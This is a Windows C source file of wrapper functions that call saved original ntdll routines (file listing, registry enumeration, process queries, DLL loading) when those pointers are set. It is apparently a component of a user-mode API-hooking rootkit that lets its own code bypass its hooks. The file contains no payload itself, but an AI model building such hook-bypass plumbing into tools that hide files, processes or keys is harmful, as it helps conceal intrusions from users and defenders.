// standard includes 
#include <winsock2.h>
#include <windows.h>
#include <time.h>

// own includes
#include "ntdll.h"
#include "engine.h"

#include "safe.h"

BOOL CheckOldFunction(LPVOID lpFunction)
{
	if (*(LPDWORD)lpFunction) return TRUE;

	return FALSE;
}

NTSTATUS WINAPI SafeNtResumeThread(HANDLE hThread,PDWORD SuspendCount)
{
	NTSTATUS rc;

	if (CheckOldFunction(&OldNtResumeThread))
		rc=OldNtResumeThread(hThread,SuspendCount);
	else
		rc=NtResumeThread(hThread,SuspendCount);

	return rc;
}

NTSTATUS WINAPI SafeLdrLoadDll(PWCHAR PathToFile,ULONG Flags,PUNICODE_STRING ModuleFileName,PHANDLE ModuleHandle)
{
	NTSTATUS rc;

	if (CheckOldFunction(&OldLdrLoadDll))
		rc=OldLdrLoadDll(PathToFile,Flags,ModuleFileName,ModuleHandle);
	else
		rc=LdrLoadDll(PathToFile,Flags,ModuleFileName,ModuleHandle);

	return rc;
}

NTSTATUS WINAPI SafeLdrUnloadDll(HANDLE hModule)
{
	NTSTATUS rc;

	if (CheckOldFunction(&OldLdrUnloadDll))
		rc=OldLdrUnloadDll(hModule);
	else
		rc=LdrUnloadDll(hModule);

	return rc;
}

NTSTATUS WINAPI SafeNtQuerySystemInformation(
       ULONG SystemInformationClass,
       PVOID SystemInformation,
       ULONG SystemInformationLength,
       PULONG ReturnLength
)
{
  NTSTATUS rc;

  if (CheckOldFunction(&OldNtQuerySystemInformation))
	  rc=OldNtQuerySystemInformation(SystemInformationClass,SystemInformation,SystemInformationLength,ReturnLength);
  else
	  rc=NtQuerySystemInformation(SystemInformationClass,SystemInformation,SystemInformationLength,ReturnLength);

  return rc;
}

NTSTATUS WINAPI SafeNtQueryDirectoryFile(
        HANDLE hFile,
        HANDLE hEvent,
        PIO_APC_ROUTINE IoApcRoutine,
        PVOID IoApcContext,
        PIO_STATUS_BLOCK pIoStatusBlock,
        PVOID FileInformationBuffer,
        ULONG FileInformationBufferLength,
        FILE_INFORMATION_CLASS FileInfoClass,
        BOOLEAN bReturnOnlyOneEntry,
        PUNICODE_STRING PathMask,
        BOOLEAN bRestartQuery
)
{
	NTSTATUS rc;

	if (CheckOldFunction(&OldNtQueryDirectoryFile))
		rc=OldNtQueryDirectoryFile(hFile,hEvent,IoApcRoutine,IoApcContext,pIoStatusBlock,FileInformationBuffer,
			FileInformationBufferLength,FileInfoClass,bReturnOnlyOneEntry,PathMask,bRestartQuery);
	else
		rc=NtQueryDirectoryFile(hFile,hEvent,IoApcRoutine,IoApcContext,pIoStatusBlock,FileInformationBuffer,
			FileInformationBufferLength,FileInfoClass,bReturnOnlyOneEntry,PathMask,bRestartQuery);

	return rc;
}

NTSTATUS WINAPI SafeNtVdmControl(ULONG ControlCode,PVOID ControlData)
{
	NTSTATUS rc;

	if (CheckOldFunction(&OldNtVdmControl))
		rc=OldNtVdmControl(ControlCode,ControlData);
	else
		rc=NtVdmControl(ControlCode,ControlData);

	return rc;
}

NTSTATUS WINAPI SafeNtDeviceIoControlFile
(
  HANDLE               FileHandle,
  HANDLE               Event,
  PIO_APC_ROUTINE      ApcRoutine,
  PVOID                ApcContext,
  PIO_STATUS_BLOCK     IoStatusBlock,
  ULONG                IoControlCode,
  PVOID                InputBuffer,
  ULONG                InputBufferLength,
  PVOID                OutputBuffer,
  ULONG                OutputBufferLength 
)
{
	NTSTATUS rc;

	if (CheckOldFunction(&OldNtDeviceIoControlFile))
		rc=OldNtDeviceIoControlFile(FileHandle,Event,ApcRoutine,ApcContext,IoStatusBlock,IoControlCode,InputBuffer,
				InputBufferLength,OutputBuffer,OutputBufferLength);
	else
		rc=NtDeviceIoControlFile(FileHandle,Event,ApcRoutine,ApcContext,IoStatusBlock,IoControlCode,InputBuffer,
				InputBufferLength,OutputBuffer,OutputBufferLength);

	return rc;
}

NTSTATUS WINAPI SafeNtEnumerateKey(
  HANDLE KeyHandle,
  ULONG Index,
  KEY_INFORMATION_CLASS KeyInformationClass,
  PVOID KeyInformation,
  ULONG Length,
  PULONG ResultLength
)
{
	NTSTATUS rc;

	if (CheckOldFunction(&OldNtEnumerateKey))
		rc=OldNtEnumerateKey(KeyHandle,Index,KeyInformationClass,KeyInformation,Length,ResultLength);
	else
		rc=NtEnumerateKey(KeyHandle,Index,KeyInformationClass,KeyInformation,Length,ResultLength);

	return rc;
}

NTSTATUS WINAPI SafeNtEnumerateValueKey(
  HANDLE KeyHandle,
  ULONG Index,
  KEY_VALUE_INFORMATION_CLASS KeyValueInformationClass,
  PVOID KeyValueInformation,
  ULONG Length,
  PULONG ResultLength
)
{
	NTSTATUS rc;

	if (CheckOldFunction(&OldNtEnumerateValueKey))
		rc=OldNtEnumerateValueKey(KeyHandle,Index,KeyValueInformationClass,KeyValueInformation,Length,ResultLength);
	else
		rc=NtEnumerateValueKey(KeyHandle,Index,KeyValueInformationClass,KeyValueInformation,Length,ResultLength);

	return rc;
}

NTSTATUS WINAPI SafeNtQueryVolumeInformationFile(
  HANDLE               FileHandle,
  PIO_STATUS_BLOCK     IoStatusBlock,
  PVOID                FileSystemInformation,
  ULONG                Length,
  FS_INFORMATION_CLASS FileSystemInformationClass 
)
{
	NTSTATUS rc;

	if (CheckOldFunction(&OldNtQueryVolumeInformationFile))
		rc=OldNtQueryVolumeInformationFile(FileHandle,IoStatusBlock,FileSystemInformation,Length,FileSystemInformationClass);
	else
		rc=NtQueryVolumeInformationFile(FileHandle,IoStatusBlock,FileSystemInformation,Length,FileSystemInformationClass);

	return rc;
}

NTSTATUS WINAPI SafeNtOpenFile(
  PHANDLE             FileHandle,
  ACCESS_MASK         DesiredAccess,
  POBJECT_ATTRIBUTES  ObjectAttributes,
  PIO_STATUS_BLOCK    IoStatusBlock,
  ULONG               ShareAccess,
  ULONG               OpenOptions 
)
{
	NTSTATUS rc;

	if (CheckOldFunction(&OldNtOpenFile))
		rc=OldNtOpenFile(FileHandle,DesiredAccess,ObjectAttributes,IoStatusBlock,ShareAccess,OpenOptions);
	else
		rc=NtOpenFile(FileHandle,DesiredAccess,ObjectAttributes,IoStatusBlock,ShareAccess,OpenOptions);

	return rc;
}

NTSTATUS WINAPI SafeNtCreateFile(
  PHANDLE              FileHandle,
  ACCESS_MASK          DesiredAccess,
  POBJECT_ATTRIBUTES   ObjectAttributes,
  PIO_STATUS_BLOCK     IoStatusBlock,
  PLARGE_INTEGER       AllocationSize,
  ULONG                FileAttributes,
  ULONG                ShareAccess,
  ULONG                CreateDisposition,
  ULONG                CreateOptions,
  PVOID                EaBuffer,
  ULONG                EaLength 
)
{
	NTSTATUS rc;

	if (CheckOldFunction(&OldNtCreateFile))
		rc=OldNtCreateFile(FileHandle,DesiredAccess,ObjectAttributes,IoStatusBlock,AllocationSize,FileAttributes,
				ShareAccess,CreateDisposition,CreateOptions,EaBuffer,EaLength);
	else
		rc=NtCreateFile(FileHandle,DesiredAccess,ObjectAttributes,IoStatusBlock,AllocationSize,FileAttributes,
				ShareAccess,CreateDisposition,CreateOptions,EaBuffer,EaLength);
	
	return rc;
}

NTSTATUS WINAPI SafeNtReadFile(
  HANDLE           FileHandle,
  HANDLE           Event,
  PIO_APC_ROUTINE  ApcRoutine,
  PVOID            ApcContext,
  PIO_STATUS_BLOCK IoStatusBlock,
  PVOID            Buffer,
  ULONG            Length,
  PLARGE_INTEGER   ByteOffset,
  PULONG           Key
)
{
	NTSTATUS rc;

	if (CheckOldFunction(&OldNtReadFile))
		rc=OldNtReadFile(FileHandle,Event,ApcRoutine,ApcContext,IoStatusBlock,Buffer,Length,ByteOffset,Key);
	else
		rc=NtReadFile(FileHandle,Event,ApcRoutine,ApcContext,IoStatusBlock,Buffer,Length,ByteOffset,Key);

	return rc;
}

NTSTATUS WINAPI SafeNtReadVirtualMemory(
  HANDLE ProcessHandle,
  PVOID BaseAddress,
  PVOID Buffer,
  ULONG NumberOfBytesToRead,
  PULONG NumberOfBytesReaded
)
{
	NTSTATUS rc;

	/*if (CheckOldFunction(&OldNtReadVirtualMemory))
		rc=OldNtReadVirtualMemory(ProcessHandle,BaseAddress,Buffer,NumberOfBytesToRead,NumberOfBytesReaded);
	else*/
		rc=NtReadVirtualMemory(ProcessHandle,BaseAddress,Buffer,NumberOfBytesToRead,NumberOfBytesReaded);

	return rc;
}

NTSTATUS WINAPI SafeNtQueryVirtualMemory(
  HANDLE ProcessHandle,
  PVOID BaseAddress,
  MEMORY_INFORMATION_CLASS MemoryInformationClass,
  PVOID Buffer,
  ULONG Length,
  PULONG ResultLength
)
{
	NTSTATUS rc;

	/*if (CheckOldFunction(&OldNtQueryVirtualMemory))
		rc=OldNtQueryVirtualMemory(ProcessHandle,BaseAddress,MemoryInformationClass,Buffer,Length,ResultLength);
	else*/
		rc=NtQueryVirtualMemory(ProcessHandle,BaseAddress,MemoryInformationClass,Buffer,Length,ResultLength);

	return rc;
}

NTSTATUS WINAPI SafeNtOpenProcess
(
  PHANDLE              ProcessHandle,
  ACCESS_MASK          AccessMask,
  POBJECT_ATTRIBUTES   ObjectAttributes,
  PCLIENT_ID           ClientId 
)
{
	NTSTATUS rc;

	if (CheckOldFunction(&OldNtOpenProcess))
		rc=OldNtOpenProcess(ProcessHandle,AccessMask,ObjectAttributes,ClientId);
	else
		rc=NtOpenProcess(ProcessHandle,AccessMask,ObjectAttributes,ClientId);

	return rc;
}

NTSTATUS WINAPI SafeNtSaveKey(
  HANDLE    KeyHandle,
  HANDLE FileHandle 
)
{
	NTSTATUS rc;

	if (CheckOldFunction(&OldNtSaveKey))
		rc=OldNtSaveKey(KeyHandle,FileHandle);
	else
		rc=NtSaveKey(KeyHandle,FileHandle);

	return rc;
}

NTSTATUS WINAPI SafeNtSaveMergedKeys(
  HANDLE KeyHandle1,
  HANDLE KeyHandle2,
  HANDLE FileHandle
)
{
	NTSTATUS rc;

	if (CheckOldFunction(&OldNtSaveMergedKeys))
		rc=OldNtSaveMergedKeys(KeyHandle1,KeyHandle2,FileHandle);
	else
		rc=NtSaveMergedKeys(KeyHandle1,KeyHandle2,FileHandle);

	return rc;
}
